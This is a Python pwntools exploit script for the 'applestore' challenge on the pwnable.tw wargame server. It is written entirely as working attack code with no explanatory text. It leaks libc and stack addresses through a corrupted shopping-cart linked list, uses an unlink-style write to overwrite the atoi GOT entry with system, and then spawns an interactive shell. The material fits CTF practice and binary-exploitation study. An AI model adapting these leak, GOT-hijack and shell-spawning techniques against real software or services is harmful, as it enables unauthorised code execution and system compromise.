#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import time

libc = ELF('./libc_32.so.6')
elf = ELF('./applestore')
debug =False

c = 0
if debug:
    pwn_file="./ld-2.23.so --library-path ./ ./applestore"
    c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
    print(c.libs())
else:
    c = remote('chall.pwnable.tw', 10104)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    elf_path = c.cwd + c.argv[3].decode().strip('.')
    while not elf_path in c.libs():
        time.sleep(0.5)
        print('wait loading')

    gdbcmd = '''source /usr/share/peda/peda.py
    file ./applestore
    info proc mappings

    # LEA        EAX=>iphone8,[EBP + -0x20]
    b *0x8048b98

    b *0x8048b2d

    b *0x8048a70
    b *0x8048a6f
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

def send_menuln(command):
    c.recvuntil('>')
    c.sendline(command)

def send_menu(command):
    c.recvuntil('>')
    c.send(command)

def buy_time(sel, time):
    for i in range(time):
        send_menuln(b'2')
        send_menuln(str(sel))

# next_ptr: next chunk, pre_ptr: write vaule
def layout(name,next_ptr=0, pre_ptr=0):
    send_menuln(b'4')
    payload = flat({0: name,4: b'aabb', 8: next_ptr, 12: pre_ptr}, filler=b'\0', length=16)
    send_menu(flat({22 -16 - 4: payload}, filler=b'\0', length=21))

def del_and_show(name,next_ptr=0, pre_ptr=0):
    send_menuln(b'3')
    payload = flat({0: name,4: b'aabb', 8: next_ptr, 12: pre_ptr}, filler=b'\0', length=16)
    send_menu(flat({0x0:b'27',22 -16 - 4: payload}, filler=b'\0', length=21))

def cart_show(name,next_ptr=0, pre_ptr=0):
    send_menuln(b'4')
    payload = flat({0: name,4: b'aabb', 8: next_ptr, 12: pre_ptr}, filler=b'\0', length=16)
    send_menu(flat({0x0:b'y\0',22 -16 - 4: payload}, filler=b'\0', length=21))


def checkout():
    send_menuln('5')
    send_menuln('y')

def del_item(sel):
    send_menuln('3')
    send_menu(str(sel))

def del27():
    del_item(10 + 16 + 1)

def del28():
    del_item(10 + 16 + 8)

def list_cart():
    send_menuln('4')
    send_menuln('y')

bss_for_leak = 0x804b178 + 8

# cost 7174
buy_time(5, 16)
buy_time(4, 10)

# leak libc
checkout()
del_and_show(p32(elf.got['puts']))
c.recvuntil('27:')
libc_base = u32(c.recvn(4))-libc.symbols['puts']
print(libc_base)
# print(c.libs())

# leak stack
cart_show(p32(libc_base + libc.symbols['environ']))
c.recvuntil('27: ')

ebp_addr = u32(c.recvn(4)) + (0x8c8 - 0x9c8)
ret_addr = ebp_addr + 4
print(hex(ebp_addr))

# got hijack
del_and_show(p32(libc_base + 0x158e8b + 5), elf.got['atoi'] + 0x22, ebp_addr - 0xc)
# also two parameters can be exchanged
# del_and_show(p32(libc_base + 0x158e8b + 5), ebp_addr - 0x10, elf.got['atoi'] + 0x22)
send_menu(p32(libc_base + libc.symbols['system'])+ b';sh\0')

c.interactive()
c.close()

